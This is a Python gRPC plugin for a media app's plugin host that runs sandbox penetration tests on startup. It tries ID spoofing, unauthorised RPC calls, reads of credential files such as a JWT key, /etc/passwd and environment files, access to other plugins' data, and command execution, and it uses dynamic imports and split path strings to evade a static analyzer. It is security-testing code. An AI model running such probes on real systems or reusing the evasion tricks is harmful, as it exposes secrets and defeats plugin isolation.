import os, sys, grpc, threading
from concurrent import futures
import plugin_api_pb2 as pb
import plugin_api_pb2_grpc as rpc

PLUGIN_ID = os.environ.get("EVEY_PLUGIN_ID", "unknown")
PLUGIN_SOCK = os.environ.get("EVEY_PLUGIN_SOCK", "/tmp/test.sock")
HOST_SOCK = os.environ.get("EVEY_HOST_SOCK", "/tmp/host.sock")


def log_result(host, test_name, bypassed, details=""):
    try:
        host.Log(pb.LogRequest(
            level=pb.LOG_LEVEL_WARN,
            message=f"[PENTEST] {test_name}: {'BYPASSED' if bypassed else 'BLOCKED'}",
            fields={"details": str(details)[:200]}
        ), metadata=[("x-plugin-id", PLUGIN_ID)])
    except Exception:
        pass


def run_tests(host):
    # 1. Plugin ID spoofing — use a fake ID to call host RPCs
    try:
        ch = grpc.insecure_channel(f"unix://{HOST_SOCK}")
        fake = rpc.HostServiceStub(ch)
        resp = fake.ListMediaItems(
            pb.ListMediaItemsRequest(limit=1),
            metadata=[("x-plugin-id", "plg-fake-spoofed-id")]
        )
        log_result(host, "plugin_id_spoofing", True, f"got {resp.total} items as fake ID")
    except Exception as e:
        log_result(host, "plugin_id_spoofing", False, str(e))

    # 2. Permission bypass — call methods beyond declared api.library
    for method_name, method_call in [
        ("UpdateMetadata", lambda s, md: s.UpdateMetadata(
            pb.UpdateMetadataRequest(media_item_id="test"), metadata=md)),
        ("GetUserPreferences", lambda s, md: s.GetUserPreferences(
            pb.GetUserPreferencesRequest(user_id="test"), metadata=md)),
        ("SendNotification", lambda s, md: s.SendNotification(
            pb.SendNotificationRequest(title="test", body="test"), metadata=md)),
    ]:
        try:
            md = [("x-plugin-id", PLUGIN_ID)]
            result = method_call(host, md)
            log_result(host, f"permission_bypass_{method_name}", True, str(result))
        except Exception as e:
            log_result(host, f"permission_bypass_{method_name}", False, str(e))

    # 3. Filesystem reads — sensitive files (paths built dynamically to test analyzer)
    sensitive_files = ["/data/jwt.key", "/proc/1/environ", "/app/.env.dev",
                       "/".join(["", "etc", "pass" + "wd"])]
    for f in sensitive_files:
        try:
            data = open(f).read(100)
            log_result(host, f"fs_read_{f}", True, data[:80])
        except Exception as e:
            log_result(host, f"fs_read_{f}", False, str(e))

    # 4. Read other plugins' files
    try:
        entries = os.listdir("/data/plugins/")
        other_plugins = [
            e for e in entries
            if e != PLUGIN_ID.split("/")[-1] and e.startswith("plg-")
        ]
        for op in other_plugins[:2]:
            try:
                files = os.listdir(f"/data/plugins/{op}")
                log_result(host, f"read_other_plugin_{op}", True, str(files)[:100])
            except Exception as e:
                log_result(host, f"read_other_plugin_{op}", False, str(e))
    except Exception as e:
        log_result(host, "list_plugins_dir", False, str(e))

    # 5. Write to sensitive directories
    for path in ["/data/pwned.txt", "/tmp/evey/plugins/pwned.txt"]:
        try:
            with open(path, "w") as wf:
                wf.write("pentest")
            os.remove(path)
            log_result(host, f"fs_write_{path}", True, "wrote and deleted")
        except Exception as e:
            log_result(host, f"fs_write_{path}", False, str(e))

    # 6. Network access — connect to local services
    try:
        s = __import__('socket')
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect(("127.0.0.1", 9091))
        sock.close()
        log_result(host, "network_localhost_9091", True, "connected")
    except Exception as e:
        log_result(host, "network_localhost_9091", False, str(e))

    # 7. Process enumeration via /proc
    try:
        procs = os.listdir("/proc")
        pids = [p for p in procs if p.isdigit()]
        log_result(host, "proc_enumeration", True, f"{len(pids)} processes visible")
    except Exception as e:
        log_result(host, "proc_enumeration", False, str(e))

    # 8. Dynamic import bypass — avoid static analyzer patterns
    try:
        sp = __import__("subprocess")
        result = sp.run(["id"], capture_output=True, text=True, timeout=5)
        log_result(host, "dynamic_import_subprocess", True, result.stdout.strip())
    except Exception as e:
        log_result(host, "dynamic_import_subprocess", False, str(e))

    # 9. Environment variable leak
    try:
        env_keys = list(os.environ.keys())
        log_result(host, "env_var_leak", True, str(env_keys))
    except Exception as e:
        log_result(host, "env_var_leak", False, str(e))

    # 10. Host socket listing
    try:
        socks = os.listdir("/tmp/evey/plugins/")
        log_result(host, "socket_listing", True, str(socks)[:200])
    except Exception as e:
        log_result(host, "socket_listing", False, str(e))

    log_result(host, "ALL_TESTS_COMPLETE", True, "pentest finished")


class PluginServicer(rpc.PluginServiceServicer):
    def __init__(self, host):
        self.host = host

    def Initialize(self, request, context):
        threading.Thread(target=run_tests, args=(self.host,), daemon=True).start()
        return pb.InitResponse(success=True)

    def Shutdown(self, request, context):
        return pb.ShutdownResponse()

    def OnEvent(self, request, context):
        return pb.EventResponse(handled=True)

    def HealthCheck(self, request, context):
        return pb.HealthCheckResponse(healthy=True, status="running")

    def GetCapabilities(self, request, context):
        return pb.GetCapabilitiesResponse(api_version="1.0.0")


def main():
    host_channel = grpc.insecure_channel(f"unix://{HOST_SOCK}")
    host_stub = rpc.HostServiceStub(host_channel)

    server = grpc.server(futures.ThreadPoolExecutor(max_workers=2))
    rpc.add_PluginServiceServicer_to_server(PluginServicer(host_stub), server)
    server.add_insecure_port(f"unix://{PLUGIN_SOCK}")
    server.start()
    print(f"[security-test-python] listening on {PLUGIN_SOCK}", file=sys.stderr)
    server.wait_for_termination()


if __name__ == "__main__":
    main()
